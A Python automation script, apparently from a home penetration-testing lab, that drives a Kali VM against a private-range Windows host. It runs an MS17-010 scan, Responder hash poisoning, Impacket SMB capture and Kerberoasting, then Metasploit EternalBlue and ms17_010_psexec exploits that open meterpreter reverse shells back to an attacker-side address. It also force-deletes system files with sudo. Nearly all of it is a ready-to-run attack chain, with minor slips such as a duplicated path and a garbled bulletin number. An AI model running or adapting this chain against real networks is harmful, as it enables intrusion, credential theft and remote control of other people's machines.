#!/usr/bin/env python3
"""Step 9: Comprehensive SMB attack + NetBIOS spoofing + responder capture"""
import subprocess
import os

VMRUN = r'D:\software\vmware\tool\vmware\tool\vmrun.exe'
VMX = r'E:\BaiduNetdiskDownload\kali-linux-2026.1-vmware-amd64.vmwarevm\kali-linux-2026.1-vmware-amd64.vmx'
TEMP = os.environ.get('TEMP', r'C:\Users\xianyv\AppData\Local\Temp')

VMRUN = r'D:\software\vmware\tool\vmrun.exe'

def run_kali(cmd, timeout=120):
    script_path = os.path.join(TEMP, 'kali_cmd.sh')
    with open(script_path, 'w', encoding='utf-8', newline='\n') as f:
        f.write(f'#!/bin/bash\n{cmd}\n')
    subprocess.run([VMRUN, '-T', 'ws', '-gu', 'kali', '-gp', 'kali',
                    'copyFileFromHostToGuest', VMX,
                    script_path, '/tmp/kali_cmd.sh'],
                   capture_output=True, text=True, timeout=30)
    subprocess.run([VMRUN, '-T', 'ws', '-gu', 'kali', '-gp', 'kali',
                    'runProgramInGuest', VMX,
                    '/bin/bash', '-c',
                    f'chmod +x /tmp/kali_cmd.sh && timeout {timeout} /tmp/kali_cmd.sh > /tmp/kali_out.txt 2>&1'],
                   capture_output=True, text=True, timeout=timeout + 30)
    out_path = os.path.join(TEMP, 'kali_out.txt')
    subprocess.run([VMRUN, '-T', 'ws', '-gu', 'kali', '-gp', 'kali',
                    'copyFileFromGuestToHost', VMX,
                    '/tmp/kali_out.txt', out_path],
                   capture_output=True, text=True, timeout=30)
    try:
        with open(out_path, 'r', encoding='utf-8', errors='ignore') as f:
            return f.read()
    except:
        return "[READ ERROR]"

# 1. Fix MSF properly
print("=" * 60)
print("[1] Fix MSF - remove bootsnap completely")
print("=" * 60)
out = run_kali(
    "echo kali | sudo -S bash -c '"
    "gem uninstall bootsnap -a -I 2>/dev/null; "
    "rm -rf /usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/bootsnap* 2>/dev/null; "
    "rm -rf /tmp/bootsnap* 2>/dev/null; "
    "find /usr/lib/llvm-18/build -type l -name \"Debug+Asserts\" -exec rm -f {} + 2>/dev/null; "
    "rm -rf /usr/lib/llvm-18/build/Debug+Asserts/build 2>/dev/null; "
    "echo DONE'"
)
print(out)

# 2. Run MSF MS17-010 scanner
print("\n" + "=" * 60)
print("[2] MSF MS17-010 scanner")
print("=" * 60)
out = run_kali(
    "echo kali | sudo -S msfconsole -q -x 'use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS 192.168.233.129; run; exit' 2>&1 | tail -20",
    timeout=180
)
print(out)

# 3. Run responder to capture hashes (LLMNR/NBT-NS poison)
print("\n" + "=" * 60)
print("[3] Responder - capture NTLMv2 hashes (15 sec)")
print("=" * 60)
out = run_kali(
    "echo kali | sudo -S timeout 15 responder -I eth0 -rdwv 2>&1 | tail -30",
    timeout=30
)
print(out)

# 4. Impacket smbserver to capture connections
print("\n" + "=" * 60)
print("[4] Impacket SMB server (capture auth)")
print("=" * 60)
out = run_kali(
    "timeout 10 impacket-smbserver share /tmp -smb2support -username guest -password guest 2>&1 &"
    "sleep 2 && "
    "echo kali | sudo -S nmblookup -B 192.168.233.129 -R -A 192.168.233.129 2>&1 && "
    "sleep 5",
    timeout=20
)
print(out)

# 5. Try impacket GetUserSPNs
print("\n" + "=" * 60)
print("[5] Impacket SMB relay + GetUserSPNs")
print("=" * 60)
out = run_kali(
    "impacket-GetUserSPNs '192.168.233.129/' -no-pass -usersfile /tmp/users.txt 2>&1 || "
    "echo 'No SPN users'",
    timeout=30
)
print(out)

# 6. Check if MSF works now
print("\n" + "=" * 60)
print("[6] MSF version check")
print("=" * 60)
out = run_kali("echo kali | sudo -S msfconsole -v 2>&1 | head -5", timeout=60)
print(out)

# 7. EternalBlue exploit module
print("\n" + "=" * 60)
print("[7] MSF EternalBlue exploit attempt")
print("=" * 60)
out = run_kali(
    "echo kali | sudo -S msfconsole -q -x '"
    "use exploit/windows/smb/ms17_010_eternalblue; "
    "set RHOSTS 192.168.233.129; "
    "set LHOST 192.168.233.133; "
    "set LPORT 4444; "
    "set PAYLOAD windows/x64/meterpreter/reverse_tcp; "
    "run -j; "
    "sleep 15; "
    "sessions -l; "
    "exit' 2>&1 | tail -30",
    timeout=120
)
print(out)

# 8. EternalRomance exploit module
print("\n" + "=" * 60)
print("[8] MSF EternalRomance (MS17-0145)")
print("=" * 60)
out = run_kali(
    "echo kali | sudo -S msfconsole -q -x '"
    "use exploit/windows/smb/ms17_010_psexec; "
    "set RHOSTS 192.168.233.129; "
    "set LHOST 192.168.233.133; "
    "set LPORT 4455; "
    "set PAYLOAD windows/meterpreter/reverse_tcp; "
    "set SMBUser guest; "
    "set SMBPass ''; "
    "run -j; "
    "sleep 15; "
    "sessions -l; "
    "exit' 2>&1 | tail -30",
    timeout=120
)
print(out)

print("\n" + "=" * 60)
print("FINAL EXPLOIT PHASE COMPLETE")
print("=" * 60)
